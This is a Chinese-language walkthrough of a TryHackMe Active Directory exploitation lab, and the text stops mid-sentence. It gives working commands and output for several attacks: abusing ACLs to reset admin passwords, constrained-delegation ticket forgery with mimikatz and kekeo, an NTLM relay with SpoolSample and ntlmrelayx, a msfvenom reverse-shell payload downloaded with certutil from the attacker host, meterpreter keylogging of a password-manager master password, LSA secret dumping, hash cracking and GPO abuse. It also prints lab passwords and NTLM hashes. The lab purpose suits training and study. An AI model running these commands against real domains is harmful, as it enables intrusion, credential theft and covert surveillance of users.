Exploiting Active Directory房间：https://tryhackme.com/room/exploitingad 时间：20250804 23:30 - 20250806 03:50 Exploiting Permission DelegationActive Directory 通过一个名为权限委派 (Permission Delegation) 的功能来委派权限和特权。一般只有很少的用户拥有 DA（域管理员）凭据的访问权限。不可能让他们处理所有来自用户的请求，例如重置他们的密码。通过使用委派，我们可以将强制更改用户密码的权限委派给 IT 服务台团队，这意味着他们现在对这个特定功能拥有了委派的特权。原则上，为了保证委派的安全性，应该遵循最小权限原则。 权限委派漏洞通常被称为 ACL-based attacks (基于 ACL 的攻击)。AD 允许管理员配置访问控制条目 (ACEs)，这些条目构成了自由访问控制列表 (DACLs)，因此得名 ACL-based attacks。几乎任何 AD 对象都可以通过 ACEs 进行安全保护，这些 ACEs 描述了其他 AD 对象对该目标对象拥有的允许和拒绝的权限。 如果 ACEs 配置错误，攻击者就可以从他们下手。如果 IT 支持团队被授予了对 Domain Users（域用户）组的 ForceChangePassword（强制更改密码）权限，这将被视为不安全的。虽然他们能够重置忘记密码的员工的密码，但这种配置错误也可能让他们重置特权账户的密码，比如那些属于 Domain Admins（域管理员）组的账户，从而实现权限提升。 ACEs大量的 ACEs 可能会被错误的配置，然后他们的利用方式也很多，Bloodhound 的文档可以帮助解释被枚举出来的 ACEs 以及如何利用它们。以下是几个典型的 ForceChangePassword: 我们能在不知道用户密码的情况下重置密码 AddMembers: 我们有将用户（包括当前用户），组和计算机加入目标组的权限。 GenericAll: 我们可以完全控制该对象，包括更改用户密码、注册 SPN 或向目标组添加 AD 对象。 GenericWrite: 我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，从而在用户下次登录时执行脚本。 “非保护参数”（non-protected parameters）指的是那些不会被 AdminSDHolder 机制保护的属性。 简单来说，Active Directory 有一套内置的安全机制，叫做 AdminSDHolder，专门用来保护高权限账户和组（如 Domain Admins）。这个机制会定期检查这些高权限对象，并强制重置它们的 ACL，以防止权限被错误修改。 WriteOwner: 我们可以更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的更多权限。 WriteDACL: 我们可以向目标对象的 DACL 写入新的 ACE。例如，我们可以编写一个 ACE，授予我们的账户对目标对象的完全控制权。 AllExtendedRights: 我们可以对目标对象执行任何与扩展 AD 权限相关的操作。例如，这包括强制更改用户密码的功能。 为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。这方面的两个最佳选择是 AD-RSAT PowerShell cmdlets 或 PowerSploit。根据漏洞和环境中的检测工具，其中一种方法可能更隐蔽。在本任务中，我们将展示这两种方法。 Bloodhound因为我用的是提供执行好的文件，就没有自己跑 Sharphound 了，把结果导入 Bloodhound 后，搜索拿到的用户名。 在 Node Info -&gt; EXECUTION RIGHTS -&gt; Group Delegated RDP Privileges 看到 DOMAIN USERS 有能访问 THMWRK1 的 RDP 权限。 然后在 Node Info -&gt; OUTBOUND CONTROL RIGHTS -&gt; Group Delegated Object 看到 DOMAIN USERS 有对 IT SUPPORT 的 GenericWrite 权限。 然后我们一般是要拿到高权限用户的权限，所以用 BloodHound 的检索功能，把自己的账户放到首位，TIER 2 ADMINS@ZA.TRYHACKME.LOC 放到目标，生成一个图出来。 可以看到我们的用户组有对 IT SUPPORT 的 GenericWrite 权限，然后 IT SUPPORT 组有对 T2 组的强制改密码权限。当一个用户对一个组拥有 GenericWrite 权限时，就意味着他可以修改这个组的任何属性，包括 member 属性。 AddMember我们会用 AD-RSAT 工具集中的 Add-ADGroupMember PowerShell cmdlet 实现这个功能。 12345# 把我们的用户加入 IT Support 组 Add-ADGroupMember &quot;IT Support&quot; -Members &quot;barbara.reid&quot; # 查看 IT Support 组成员 Get-ADGroupMember -Identity &quot;IT Support&quot; 强制改密码现在我们的账户已经是 IT Support 组成员了，所以有对 Tier 2 组改密码的权限。 1234567891011# 查看 T2 管理员组成员 找一个受害者 Get-ADGroupMember -Identity &quot;Tier 2 Admins&quot; # 新建密码变量 $Password = ConvertTo-SecureString &quot;Pass123...&quot; -AsPlainText -Force # 更改密码 Set-ADAccountPassword -Identity &quot;t2_melanie.davies&quot; -Reset -NewPassword $Password # 如果提示拒绝，执行这个断开连接再连接 # 还不行就等 10 分钟左右 gpupdate /force Exploiting Kerberos DelegationKerberos Double Hop issue客户端希望使用 Kerberos 对第一台服务器（Hop 1）进行身份验证，而第一台服务器需要代表客户端访问第二台服务器（Hop 2）上的资源。常见的情况是用户访问前端应用程序时需要修改数据库服务器上的资源。 原始的 Kerberos 无法告诉第一台服务器：”OK，你可以访问服务器上的资源了： “您可以代表客户访问第 2 服务器上的资源。” 原始 Kerberos 协议的局限性原始 Kerberos 协议的流程是这样的： 用户向 KDC (密钥分发中心) 证明自己的身份，并获得一个 **TGT (票据授权票据)**。 用户使用这个 TGT 向 KDC 请求一个专门用于访问 Hop 1 服务器的 **TGS (服务票据)**。 用户使用这个 TGS 向 Hop 1 服务器进行身份验证，并开始通信。 到这里，整个流程就结束了。Kerberos 的设计只考虑了客户端（用户）和第一个服务器（Hop 1）之间的通信。 为什么不能简单地转发 TGS？ TGS 的加密机制：用户从 KDC 获得的 TGS 是用 Hop 1 服务器的密钥加密的。只有 Hop 1 服务器能解密它，并从中获得会话密钥。 无法将 TGS 转发给 Hop 2：Hop 2 服务器无法解密这个 TGS，因为它没有 Hop 1 服务器的密钥。因此，用户不能简单地将 TGS 转发给 Hop 2。 权限绑定：TGS 明确绑定了一个用户和一个特定服务。它不包含任何“代表他人”去访问其他服务的权限。原始协议没有“委托（delegation）”的概念。 解决方案：Kerberos 委派（Kerberos Delegation）为了解决这个问题，微软和其他组织对 Kerberos 协议进行了扩展，引入了 Kerberos 委派的功能。 委派的核心思想是允许服务（例如 Hop 1 服务器）以用户的身份去向 KDC 请求一个新的 TGS，这个新的 TGS 是专门用于访问其他服务（例如 Hop 2 服务器）的。 这就是为什么现在有非约束性委派 (Unconstrained Delegation) 和约束性委派 (Constrained Delegation) 等多种委派形式。它们都是对原始 Kerberos 协议的增强，专门用于处理多跳的身份验证场景。 Constrained vs UnconstrainedKerberos 委派有两种类型。在 Kerberos 委派最初的实现中，使用了**非约束性委派 (Unconstrained Delegation)**，这是最不安全的方法。 本质上，非约束性委派对委派没有施加任何限制。它的后台工作原理是：如果一个设置了 TRUSTED_FOR_DELEGATION 标志的用户在一个配置了非约束性委派的主机上进行身份验证，那么就会为这个用户账户生成一个 TGT，并将其存储在主机的内存中，以便将来需要时使用。 假设攻击者能够攻陷一个启用了非约束性委派的主机，他们就可以尝试强制一个特权账户（如域管理员）向该主机进行身份验证，这使他们能够拦截生成的 TGT，并冒充这个特权服务。如果你想看一个非约束性委派利用的例子，可以看这里。 为了克服无约束委托的安全缺陷，微软在 2003 年推出了受限委托。受限委托限制了账户可以委托给哪些服务，从而在账户受到威胁时限制了风险。以下是可配置授权的服务示例： HTTP - 用于 Web 应用程序，允许使用 AD 凭据进行直通式（pass-through）身份验证。 CIFS - Common Internet File System，用于文件共享，允许将用户委派到文件共享。 LDAP - 用于委派给 LDAP 服务，执行诸如重置用户密码之类的操作。 HOST - 允许将账户委派给主机上的所有活动。 MSSQL - 允许将用户账户委派给 SQL 服务，以进行数据库的直通式身份验证。 利用约束性委派通常比利用非约束性委派更复杂，因为被委派的账户不能被用于访问所有东西。如果我们能拿到一个有约束性委派的 AD 账户的话。知道他的明文密码甚至他的 NTLM hash，我们能生成这个账户的 TGT。然后我们可以使用这个 TGT 来为任何非敏感的用户账户执行一个 TGS 请求，以便以该用户的身份访问服务。 整个过程简单说是这样的： 攻击者：掌握了服务账户的密码。 攻击者利用这个服务账户的权限，伪造一个代表用户 A的票据。 攻击者使用这个伪造的票据，去向 KDC 申请一个冒充用户 A访问服务 B的票据。 冒充过程（攻击流程）这个过程是利用了 Kerberos 的两个扩展协议：S4U2self 和 S4U2proxy。攻击者在拥有了配置了约束性委派的服务账户凭据（密码或 NTLM 哈希）后，可以执行以下步骤： 生成服务账户的 TGT： 攻击者首先使用窃取的服务账户的凭据（密码或 NTLM 哈希），向 KDC（密钥分发中心）请求一个该服务账户的 TGT。有了这个 TGT，攻击者就完全拥有了这个服务账户的身份。 执行 S4U2self 请求（伪造身份）： 攻击者现在以被攻陷的服务账户的身份，向 KDC 发出请求。这个请求的目的是“代表”另一个用户 A（即你说的“非敏感用户账户”），向 KDC 请求一个服务票据（TGS），但这个 TGS 是用于访问自己（服务账户本身）的。KDC 看到这个请求后，会检查服务账户是否被信任用于委派（即是否设置了TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 标志）。如果设置了，KDC 会信任这个请求，并为用户 A生成一个有效的、可转发的 TGS。这个 TGS 相当于 KDC 认可的一个“用户 A 的身份凭证”。 执行 S4U2proxy 请求（冒充访问）： 攻击者拿到上一步获得的“用户 A 的身份凭证”后，再次向 KDC 发出请求。这次的请求是希望以用户 A的身份，去访问一个被约束性委派允许访问的服务 B（例如，一个敏感数据库）。KDC 收到这个请求后，会进行严格的检查： 检查该服务账户是否被允许代表用户去访问服务 B。 这个检查是通过查看服务账户的 msDS-AllowedToDelegateTo 属性中是否包含服务 B 的 SPN。 如果检查通过，KDC 就会为攻击者（以服务账户的身份）颁发一个 TGS，这个 TGS 明确表示攻击者现在可以以用户 A的身份去访问服务 B。 访问目标服务： 攻击者使用这个 TGS，就可以冒充用户 A，去访问敏感数据库，并执行用户 A 有权限的任何操作。 什么是非敏感的用户账户？在 Kerberos 委派的上下文中，“非敏感用户账户”指的是没有被设置为拒绝委派的账户。 在 Active Directory 中，某些账户可以被标记为“敏感且不可委派”（Account is sensitive and cannot be delegated）或属于 Protected Users 组。 如果一个账户被标记为敏感，或者属于 Protected Users 组，那么 KDC 会拒绝任何 S4U 请求，即不允许其他服务账户代表这个用户去访问任何其他服务。 攻击者通常会选择那些没有这些安全标记的普通用户账户进行冒充。虽然攻击者无法冒充域管理员，但他们可以冒充一个有权访问敏感数据库的普通用户，这同样能造成巨大的危害。 Resource-Based Constrained Delegation实际上，Kerberos 委派有三种类型。但这一种值得单独提出来说。基于资源的约束性委派（RBCD）由微软在 2012 年引入，它再次为 Kerberos 委派增加了额外的安全限制。 RBCD 彻底改变了委派模型。它不再是指定哪个对象可以委派给哪个服务，而是由服务本身来指定哪个对象可以委派给它。这使得服务所有者能够控制谁可以访问它。 在我们 Web 应用程序的例子中，这意味着我们不再需要在 Web 服务账户上指定它可以委派给数据库服务来访问数据库；而是可以在数据库服务上指定，允许 Web 服务账户委派访问它。 假设我们有权限为某个服务配置 RBCD。这意味着我们有能力为该服务的 AD 对象设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。我们可以用我们拥有的一个 AD 账户的详细信息来填充这个属性。为了现在获得对该服务的访问权限，我们可以为我们控制的账户生成一个 TGT，这将允许我们与该服务进行交互。如果你想看一个 RBCD 漏洞利用的详细例子，可以看这里。 三种委派的区别这三种委派方式的主要区别在于谁拥有权限控制权，以及权限的范围有多大。 非约束性委派 (Unconstrained Delegation) 控制权：权限控制权在服务账户本身。 权限范围：无限制。 工作原理：当用户访问一个配置了非约束性委派的服务器时，KDC 会将用户的 TGT (票据授权票据) 连同服务票据一起发送给服务器。服务器会将这个 TGT 存储在内存中。有了这个 TGT，服务器可以代表该用户去访问域中任何其他服务，没有任何限制。 安全性：最不安全。一旦攻击者攻陷了这台服务器，他们就可以从内存中窃取所有用户的 TGT，从而完全冒充这些用户，包括域管理员。 约束性委派 (Constrained Delegation) 控制权：权限控制权在服务账户。 权限范围：有限制，但受限于服务账户本身。 工作原理：管理员在 AD 中为服务账户配置一个列表，明确指定这个服务账户可以代表用户去访问哪些特定的服务（通过服务主名称 SPN 来指定）。当服务需要代表用户访问其他服务时，它会向 KDC 证明自己有代表用户的能力，然后 KDC 才会为它颁发一个专门用于访问指定服务的票据。 安全性：比非约束性委派安全得多，因为它限制了服务可以访问的资源范围。即使服务账户被攻陷，攻击者也只能冒充用户去访问这个列表中指定的那些服务。 基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD) 控制权：权限控制权在资源（或服务）所有者。 权限范围：有限制，且限制在资源本身。 工作原理：这种模式颠倒了控制逻辑。管理员不是在服务账户上配置它能访问哪些服务，而是在被访问的资源（例如 SQL 服务器）上配置一个列表，明确指定哪些服务账户被允许代表用户来访问它。 安全性：最安全。这种模式将权限控制权下放给了资源所有者，他们可以更精细地控制谁可以访问他们的资源。这使得横向移动攻击更加困难，因为攻击者即使攻陷了某个服务账户，也不能随意冒充用户去访问未授权的资源。 总结表格 特性 非约束性委派 约束性委派 基于资源的约束性委派 (RBCD) 控制权 服务账户 服务账户 资源账户 配置位置 服务账户对象上 服务账户对象上 资源（被访问服务）对象上 权限范围 域内所有服务 指定的服务列表 允许访问资源的特定服务列表 安全性 最低 较高 最高 实践这个任务会利用受限制的委托完成，首先我们要做的是枚举可用的委托。让我们使用新的特权用户来执行网络命令。我们可以运行以下命令，使用 PowerSploit 的 Get-NetUser cmdlet 进行枚举： 12345678910111213141516171819202122232425262728293031323334353637Import-Module C:\\Tools\\PowerView.ps1 Get-NetUser -TrustedToAuth logoncount : 39 badpasswordtime : 1/1/1601 12:00:00 AM distinguishedname : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc objectclass : {top, person, organizationalPerson, user} displayname : IIS Server lastlogontimestamp : 8/4/2025 11:50:10 AM userprincipalname : svcIIS@za.tryhackme.loc name : IIS Server objectsid : S-1-5-21-3885271727-2693558621-2658995185-6155 samaccountname : svcIIS codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 8/4/2025 10:50:10 AM instancetype : 4 usncreated : 78494 objectguid : 11e42287-0a25-4d73-800d-b62e2d2a2a4b sn : Server lastlogoff : 1/1/1601 12:00:00 AM msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc dscorepropagationdata : 1/1/1601 12:00:00 AM serviceprincipalname : HTTP/svcServWeb.za.tryhackme.loc givenname : IIS lastlogon : 8/5/2025 2:43:56 AM badpwdcount : 0 cn : IIS Server useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION whencreated : 4/27/2022 11:26:21 AM primarygroupid : 513 pwdlastset : 4/29/2022 11:50:25 AM usnchanged : 176228 从上面的输出（关注 msds-allowedtodelegateto）我们可以看到 svcIIS 账户可以在 THMSERVER1 上委派 HTTP 和 WSWAN 服务。你会认为这意味着我们只能代表冒充用户访问网站。但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。最理想的选择是冒充 Tier 1 管理员，因为这样我们就能获得 THMSERVER1 的管理访问权限。 如果你在 THMWRK1 上执行适当的后渗透枚举，你会发现主机上有一个以 svcIIS 用户身份运行的服务。由于我们现在拥有管理权限，因此我们可以利用这一点来转储 LSASecrets，这是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。 1234567891011# 运行 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 提升到 SYSTEM 权限 token::elevate # 从注册表配置单元提取明文凭据 lsadump::secrets ... Secret : _SC_thmwinauth / service &#39;thmwinauth&#39; with username : svcIIS@za.tryhackme.loc cur/text: Password1@ 现在有了 svcIIS 账户的密码，我们能用 Kekeo 和 Mimikatz 组合实现 Kerberos Delegation 攻击，我们会用 Kekeo 生成 ticket 然后用 Mimikatz 去加载 ticket 进内存。 123456789# 找一个受害者 Get-ADGroupMember -Identity &quot;Tier 1 Admins&quot; # t1_eileen.burton # 执行 kekeo C:\\Tools\\kekeo\\x64\\kekeo.exe # 生成一个 svcIIS 的 TGT tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@ 现在我们有了可以执行委托的账户的 TGT，就可以为要冒充的账户伪造 TGS 请求了。我们需要对 HTTP 和 WSMAN 执行此操作，以便在 THMSERVER1 上创建 PSSession： 1234# 以用户 t1_eileen.burton 的身份生成一个 HTTP TGS tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:http/THMSERVER1.za.tryhackme.loc # 以用户 t1_eileen.burton 的身份生成一个 WSMAN TGS tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:wsman/THMSERVER1.za.tryhackme.loc 现在用 mimikatz 导入这两个 TGS： 1234567891011121314151617181920212223242526272829303132333435363738394041# 打开 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 载入 TGS kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi exit # 使用 klist 查看载入的 TGS klist Current LogonId is 0:0x3bb224 Cached Tickets: (2) #0> Client: t1_eileen.burton @ ZA.TRYHACKME.LOC Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize Start Time: 8/5/2025 7:07:51 (local) End Time: 8/5/2025 17:07:48 (local) Renew Time: 8/12/2025 7:07:48 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0 Kdc Called: #1> Client: t1_eileen.burton @ ZA.TRYHACKME.LOC Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize Start Time: 8/5/2025 7:08:01 (local) End Time: 8/5/2025 17:07:48 (local) Renew Time: 8/12/2025 7:07:48 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0 Kdc Called: # 进入 PSSession Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc 这下就有 THMSERVER1 的 Shell 了。 推荐阅读What Is Kerberos Delegation? An Overview of Kerberos Delegation Exploiting Relays这个房间讲的就是利用 SMB 没用强制要求加密的漏洞，导致认证可以被截获。 Windows 主机都有一个机器账户。本质上，这是与该机器关联的用户账户。除非有人篡改过主机的账户，否则这些账户的密码是不可破解的。默认情况下，它们的密码长达 120 个字符（UTF16 编码），并每 30 天自动轮换一次。 在 AD 中，这些机器账户被大量用于不同的服务中。不同的域控制器使用它们的机器账户来同步 AD 的更新和更改。当你代表你正在工作的主机请求一个证书时，该主机的机器账户会被用于向 AD 证书服务进行身份验证。 在 AD 中有一个特殊情况，即一台机器对另一台机器拥有管理权限。本质上，在 AD 配置中，一台主机被授予了对另一台主机的管理权限。同样，这是预期的功能，例如必须进行同步的域控制器或 SQL 集群。然而，这些实例为强制认证提供了一个非常有趣的攻击途径。 使用以下的语法能在 BloodHound 中查询到这个途径： 1MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p 这里我梳理一下，SERVER MANAGEMENT 组是 THMSERVER1 的管理员，然后 THMSERVER2 是 SERVER MANAGEMENT 组的一员，这就代表 THMSERVER2 对 THMSERVER1 有管理权限。 打印机 Bug这个打印机漏洞是 MS-RPRN 协议（打印系统远程协议）的一个“功能”，它允许一个域用户远程强制运行了 Print Spooler 服务的目标主机向一个任意的 IP 地址进行身份验证。 因此，要利用这一点，除了拥有机器账户的管理权限之外，我们还需要满足以下四个条件： 一套有效的 AD 账户凭据。 与目标主机的 SMB 服务的网络连接。 目标主机必须运行 Print Spooler 服务。 主机必须没有强制启用 SMB 签名。 我们要在对 THMSERVER2 没有访问权限的情况下确定 Print Spooler Service 是否在运行。 1234GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc # 如果提示 Access Denied 就用这个命令 Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc 如果都获取不到结果，直接忽略他，靶机环境肯定是可以用的 SMB 签名为了中继强制的身份验证尝试，不应该强制启用 SMB 签名。允许 SMB 签名和强制启用 SMB 签名是有区别的。由于一些遗留系统不支持 SMB 签名，默认情况下，SMB 的配置是允许但非强制签名，这意味着只有在双方都支持时才会使用。由于我们将托管一个恶意的 SMB 服务器，我们可以确保我们的服务器不支持签名，从而强制目标不签署 SMB 身份验证尝试。 参考文章：https://www.freebuf.com/articles/network/383408.html 检查 SMB 强制签名是否打开可以用 nmap 扫描： 1nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc 我们会用 SpoolSample 实现这个认证中继攻击，强制 THMSERVER2 去向我们进行身份认证，再用 impacket 的 ntlmrelayx.py 中继到 THMSERVER1，这样我们就相当于有 THMSERVER2 的权限了（中继服务器把认证截获了，不是这台机器的 Shell 权限，指的是 THMSERVER2 访问 THMSERVER1 的权限）。 123456789101112# 执行命令 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -c &#39;whoami /all&#39; -debug # 拿 Flag python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -c &quot;powershell -c \\&quot;Get-Content C:/Users/Administrator.ZA/Desktop/flag3.txt\\&quot;&quot; -debug # 进 SMB 会话 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -i -debug nc 127.0.0.1 11000 # RDP 连接到机器 xfreerdp3 /v:thmwrk1.za.tryhackme.loc /d:za.tryhackme.loc /u:t2_melanie.davies /p:Pass123... /timeout:60000 C:\\Tools\\SpoolSample.exe THMSERVER2.za.tryhackme.loc &quot;10.50.57.85&quot; 同时可以提取用户的 Hash 去爆破 12345678910111213141516171819# Hashdump 要 10 分钟以上 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -debug ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae::: trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a::: # 用 Hashcat 爆破密码 ./hashcat.exe hash.txt rockyou.txt 31d6cfe0d16ae931b73c59d7e0c089c0: Approaching final keyspace - workload adjusted. # 破解出来 trevor.local 账户的密码 RDP 登不上去 43460d636f269c709b20049cee36ae7a:Password1@ # SSH 也登不上去 ssh trevor.local@THMSERVER1.za.tryhackme.loc Exploiting AD Users现在我们在工作站和服务器上有完整的管理权了，现在可以进行后渗透了。 这一节是从用户下手，收集用户的使用习惯 凭证管理 - 用户如何存储其凭证。在 AD 中，这一点相当重要，因为用户可能有多套凭证，记住所有凭证可能会很麻烦，这一节会拿一个 KeePass 下手。 键盘记录和截屏 寻找密码管理器数据库要找一个后缀是 .kdbx 的文件，这是 KeePass 的数据库文件，但是这个数据库被一个密码加密，我们还要找到这个密码。 这里用 Meterpreter 解决 1234567891011# 生成小马 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.57.85 LPORT=4444 -f exe -o shell.ps1 msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.85; set LPORT 4444; exploit&quot; # 下载文件 certutil.exe -urlcache -split -f http://10.50.57.85:8081/shell.ps1 # curl 下载 wget -o shell.exe http://10.50.57.85:8081/shell.ps1 # 执行小马 ./shell.ps1 找 kdbx 文件： 123456789101112131415meterpreter &gt; search -d &quot;C:/Users/&quot; -f *.kdbx Found 6 results... ================== Path Size (bytes) Modified (UTC) ---- ------------ -------------- C:\\Users\\Administrator.ZA\\Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\Administrator.ZA\\My Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\t1_trevor.jones\\My Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\trevor.local\\Documents\\PasswordDatabase.kdbx 2190 2022-04-30 11:36:02 -0400 C:\\Users\\trevor.local\\My Documents\\PasswordDatabase.kdbx 2190 2022-04-30 11:36:02 -0400 # 下载文件 download &quot;C:\\Users\\Administrator.ZA\\Documents\\PasswordDatabase.kdbx&quot; admin.kdbx download &quot;c:\\Users\\trevor.local\\Documents\\PasswordDatabase.kdbx&quot; trevor.kdbx 寻找密码管理器主密码现在就是要抓到那个数据库的密码了。 123456789101112131415161718192021222324# 用这个命令看用户是不是活跃 ps | grep &quot;explorer&quot; # 没回显就跟着下面做 # 进 shell shell # 改用户的密码 net user trevor.local Pass123... # 登录 RDP xfreerdp3 /v:10.200.60.201 /u:trevor.local /p:Pass123... /timeout:60000 # 查看 Explorer 的 PID ps | grep &quot;explorer&quot; # 转移到用户的会话下面 migrate 4360 # 抓用户输入 keyscan_start # 过2分钟执行这个，就把输入抓出来了 keyscan_dump Dumping captured keystrokes... keep&lt;CR&gt; &lt;Shift&gt;Imreallysurenoonewillguessmypassword&lt;CR&gt; 从这里下客户端：https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download 然后导入数据库，用抓到的密码解密，两个数据库我都帮你们看了，Administrator 用户是空的数据库，那个本地用户的数据库里有货。顺利拿到 flag 和一个 svcServMan 用户的密码。 Exploiting GPO上一节拿到了 svcServMan 用户，我们就可以从这里下手，看看这个用户有什么用。 这个攻击路径非常清晰： 初始权限：我们拥有一个账户，它对 MANAGEMENT SERVER PUSHES GPO 拥有 GenericWrite 权限。 攻击目标：这个 GPO 通过 GpLink 链接到了 MANAGEMENT SERVER OU。 最终受害者：MANAGEMENT SERVER OU 包含了机器 THMSERVER2.ZA.TRYHACKME.LOC。 因此，我们可以利用 GenericWrite 权限修改 GPO 的内容，然后这个被修改的 GPO 会自动应用到 THMSERVER2 这台机器上，从而让我们控制这台主机。 组策略对象（GPO）GPO 是一个包含各种策略设置的虚拟集合，每台 Windows 计算机都有一个本地策略配置，可设置防火墙、用户组、启动脚本和安全协议等。在大型组织中，为了集中管理这些设置，可以使用组策略管理（GPM）来在 Active Directory (AD) 结构上定义 GPO。 GPO 的存储与应用所有 GPO 都以唯一的 GUID 名称存储在 AD 的 SYSVOL 目录下，并被复制到所有加入域的机器上。域内计算机每隔 15 分钟会自动从 SYSVOL 目录拉取 GPO 并应用相关策略。也可以通过手动运行 gpupdate 命令来立即应用。 Exploiting GPOs在本地管理员组和本地远程桌面用户组中添加一个我们控制的 AD 账户。这样，我们就能获得 THMSERVER2 的管理权限，并能 RDP 登录。 为了修改 GPO，我们需要以拥有相关权限的 AD 用户身份访问组策略管理。使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 修改 GPO。 123456runas /netonly /user:za.tryhackme.loc\\svcServMan cmd.exe Sup3rStr0ngPass!@ # 验证一下密码 dir \\\\za.tryhackme.loc\\sysvol # 打开 MMC mmc 添加好管理单元然后展开，可以看到我们现在可以编辑这个 GPO。 把 IT Support 加入这个组就行。 等 15 分钟左右，让 GPO 生效，这下我们一开始加入 IT Support 组的用户就有对 THMSERVER2 的管理和 RDP 权限了。 1xfreerdp3 /v:thmserver2.za.tryhackme.loc /d:za.tryhackme.loc /u:barbara.reid /p:Password1 /timeout:60000 Exploiting Certificates利用证书生成 TGT (Ticket Granting Ticket) 的机制，是 Kerberos 协议的一个扩展功能，称为 PKINIT（Public Key Cryptography for Initial Authentication in Kerberos）。 简单来说，PKINIT 允许客户端使用数字证书来替代传统的用户名和密码进行 Kerberos 的初始认证，也就是获取 TGT 的过程。 SpecterOps 所做的研究和发布的白皮书显示，利用配置错误的证书模板进行权限升级和横向移动是可能的，主要讲的是用证书模板的一些参数，以下是示例： Client Authentication - 证书可用于客户端身份验证。 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 证书模板允许我们指定 Subject Alternative Name (SAN)。 CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 证书可与私钥一起导出。 Certificate Permissions - 我们拥有使用此证书模板所需的权限。 利用证书模板12# 导出证书模板 certutil -Template -v &gt; templates.txt [32] 号证书，我只保留了要关注的字段 123456789Template[32]: TemplatePropPrivateKeyFlags = 1010010 (16842768) CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16) TemplatePropGeneralFlags = 20241 (131649) CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1 Allow Enroll ZA\\THMSERVER2$ Allow Auto-Enroll ZA\\THMSERVER2$ Allow Read ZA\\THMSERVER2$ 安全漏洞点分析 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 这个标志是整个攻击的核心。它允许申请者自行指定证书的主体名称。 安全风险: 正常的证书申请，CA 会从你的 AD 账户信息中自动填充你的名字。但这个标志绕过了这个安全机制。 攻击利用: 攻击者可以利用这个点，在申请证书时将主体名称伪造成任何高权限用户（比如 Administrator），从而冒充他人身份。 CTPRIVATEKEY_FLAG_EXPORTABLE_KEY 这个标志使得私钥可以被导出。 安全风险: 